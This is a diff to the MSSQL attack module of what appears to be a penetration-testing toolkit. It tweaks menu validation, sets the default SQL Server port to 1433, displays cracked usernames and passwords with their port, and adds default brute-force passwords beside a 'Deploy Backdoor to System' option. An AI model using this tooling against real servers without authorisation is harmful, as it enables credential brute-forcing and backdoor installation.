@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 from src.core.setcore import *
 from src.core.menu import text
 import subprocess
@@ -41,6 +41,11 @@ try:
             if attack_vector_sql == '1':
                 print "\nHere you can select either a CIDR notation/IP Address or a filename\nthat contains a list of IP Addresses.\n\nFormat for a file would be similar to this:\n\n192.168.13.25\n192.168.13.26\n192.168.13.26\n\n1. Scan IP address or CIDR\n2. Import file that contains SQL Server IP addresses\n"
                 choice = raw_input(setprompt(["19", "21", "22"], "Enter your choice (ex. 1 or 2) [1]"))
+		if choice != "1":
+			if choice != "2":
+				if choice !="":
+					print_error("You did not specify 1 or 2! Please try again.")
+					choice =raw_input(setprompt(["19", "21", "22"], "Enter your choice (ex. 1 or 2) [1]"))
                 # grab ip address
                 if choice == "": choice = "1"
                 if choice == "1":
@@ -52,7 +57,7 @@ try:
                             print_error("File not found! Please type in the path to the file correctly.")
                         else:
                             break            
-                if choice == "1": port = ""                   
+                if choice == "1": port = "1433"                   
                 if choice == "2": port = "1433"
                 # ask for a wordlist
                 wordlist = raw_input(setprompt(["19","21","22"], "Enter path to a wordlist file [use default wordlist]"))
@@ -154,7 +159,7 @@ try:
                             if success != "":
                                 success = success.rstrip()
                                 success=success.split(",")
-                                success= bcolors.BOLD + success[0] + bcolors.ENDC + "   username: " + bcolors.BOLD + "%s" % (success[1]) + bcolors.ENDC + " | password: " + bcolors.BOLD + "%s" % (success[3]) + bcolors.ENDC
+                                success= bcolors.BOLD + success[0] + bcolors.ENDC + "   username: " + bcolors.BOLD + "%s" % (success[1]) + bcolors.ENDC + " | password: " + bcolors.BOLD + "%s" % (success[3]) + bcolors.ENDC + "   SQLPort: " + bcolors.BOLD + "%s" % (success[2]) + bcolors.ENDC
                                 print "   " + str(counter) + ". " + success
                                 # increment counter
                                 counter = counter + 1
@@ -174,7 +179,7 @@ try:
                                 # if we equal the number used above
                                 if counter == int(select_server):
                                         #  ipaddr + "," + username + "," + str(port) + "," + passwords
-                                    print "\nHow do you want to deploy the binary via debug (win2k, winxp, win2003) and/or powershell (vista,win7) or just a shell\n\n   1. Deploy Backdoor to System\n   2. Standard Windows Shell\n\n   99. Return back to the main menu.\n"
+                                    print "\nHow do you want to deploy the binary via debug (win2k, winxp, win2003) and/or powershell (vista,win7,2008,2012) or just a shell\n\n   1. Deploy Backdoor to System\n   2. Standard Windows Shell\n\n   99. Return back to the main menu.\n"
                                     option = raw_input(setprompt(["19","21","22"], "Which deployment option do you want [1]"))
                                     if option == "": option = "1"
                                     # if 99 then break
@@ -209,6 +214,7 @@ try:
                 # establish base counter for connection
                 counter = 0
                 try:
+                    import _mssql
                     conn = _mssql.connect(sql_server + ":" + str(sql_port), sql_username, sql_password)
                     counter = 1
                 except Exception, e:
@@ -326,9 +332,10 @@ try:
             if dict == "":
                 # write out a file
                 filewrite = file(setdir + "/dictionary.txt", "w")
-                filewrite.write("\nPassword1")
+                filewrite.write("\nPassword1\nPassword!\nlc username")
                 # specify the path
                 dict = setdir + "/dictionary.txt"
+                filewrite.close()
 
             # if we are not brute forcing
             if dict.lower() == "no":
